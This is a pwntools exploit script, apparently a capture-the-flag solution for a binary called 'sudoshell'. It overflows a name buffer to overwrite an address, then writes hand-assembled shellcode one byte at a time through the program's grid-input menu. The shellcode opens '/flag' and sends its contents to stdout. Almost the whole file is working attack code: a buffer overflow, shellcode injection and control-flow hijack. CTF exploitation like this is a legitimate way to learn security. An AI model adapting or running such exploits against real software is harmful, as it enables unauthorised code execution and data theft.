from pwn import *
from subprocess import check_output
import sys
import os

_path = "./sudoshell"
context.binary = exe = ELF(_path, checksec=False)
#libc = ELF("./libc.so.6", checksec=False)
#ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
addr = 'localhost'
port = 8080
cmd = f'''
    set solib-search-path {os.getcwd()}
    decompiler connect ida --host localhost --port 3662
    continue
    break *0x0000000000401C9C
    break *0x0000000000401BB8
'''

context.terminal = ['wt.exe', 'wsl', '-e', 'bash', '-c']

def get_pid(name):
    return int(check_output(["pgrep", "-f", "-n", name]))
def conn():
    if args.LOCAL:
        if args.GDB:
            p = gdb.debug(_path, cmd)
        else:
            p = exe.process()
    
    if args.DOCKER:
        p = remote(addr, port)
        sleep(2)
        if args.GDB:
            pid = get_pid("")
            gdb.attach(pid, exe=exe.path,
                    gdbscript=cmd+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe")
            pause()

    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return p(rol(v ^ key, 0x11, 64))


def p(_data, _arch = 64, endian = 'little'):
    switcher = {
        64: p64(_data & 0xffffffffffffffff, endian),
        32: p32(_data & 0xffffffff, endian),
        16: p16(_data & 0xffff, endian),
        8:  p8(_data & 0xff, endian)
    }
    return switcher[_arch]

chall = conn()

def sl(_data):
    chall.sendline(_data)

def sla(rgx, _data):
    chall.sendlineafter(rgx, _data)

def se(_data):
    chall.send(_data)

def sa(rgx, _data):
    chall.sendafter(rgx, _data)

def check():
    chall.interactive()
    exit()

def inp(cols, rows, val):
    sla(b"> ", str(cols) + " " + str(rows) + " " + str(val))

def main():
    sla(b"> ", b"1")
    payload = flat(
        b"A"*0x20,
        p64(0x404228-8)[:-1],
    )
    sla(b"name? ", payload)
    sc = asm(
'''
xor eax, eax
nop
mov rdi, 0x67616c662f
push rdi
push rsp
pop rdi
mov rsi, 0
xor edx, edx
mov al, 0x2
syscall

mov rsi, rax
mov rdi, 1
xor edx, edx
mov r10, 0x100
mov al, 40
syscall
'''
    )
    p64(0x4041d0)
    ls = list(sc)
    print(ls)
    print(len(sc))  
    for i in range(len(ls)):
        inp(10, 0xa0+i, ls[i])

    # input()
    inp(20, 0x9e+0, 0xd0)
    inp(20, 0x9e+1, 0x41)
    inp(20, 0x9e+2, 0x40)

    # input()
    inp(1, 2, 0x41)
    inp(1, 4, 0x42)
    inp(1, 6, 0x43)
    inp(1, 7, 0x44)
    inp(1, 8, 0x45)
    inp(1, 9, 0x46)
    inp(2, 3, 0x47)
    inp(2, 2, 0x91)
    inp(2, 7, 0x48)
    inp(2, 8, 0x49)
    inp(2, 9, 0x50)
    inp(3, 1, 0x51)
    inp(3, 4, 0x52)
    inp(3, 5, 0x53)
    inp(3, 6, 0x54)
    inp(3, 7, 0x55)
    inp(3, 9, 0x56)
    inp(4, 2, 0x57)
    inp(4, 3, 0x58)
    inp(4, 4, 0x59)
    inp(4, 6, 0x60)
    inp(4, 7, 0x61)
    inp(4, 8, 0x62)
    inp(5, 2, 0x63)
    inp(5, 3, 0x64)
    inp(5, 5, 0x65)
    inp(5, 7, 0x66)
    inp(5, 8, 0x67)
    inp(6, 2, 0x68)
    inp(6, 3, 0x69)
    inp(6, 4, 0x70)
    inp(6, 6, 0x71)
    inp(6, 7, 0x72)
    inp(6, 8, 0x73)
    inp(7, 1, 0x74)
    inp(7, 3, 0x75)
    inp(7, 4, 0x76)
    inp(7, 5, 0x77)
    inp(7, 6, 0x78)
    inp(7, 9, 0x79)
    inp(8, 1, 0x80)
    inp(8, 2, 0x81)
    inp(8, 3, 0x82)
    inp(8, 7, 0x83)
    inp(8, 8, 0x84)
    inp(9, 1, 0x85)
    inp(9, 2, 0x86)
    inp(9, 3, 0x87)
    inp(9, 4, 0x88)
    inp(9, 6, 0x89)
    inp(9, 8, 0x90)

    check()

if __name__ == "__main__":
    main()
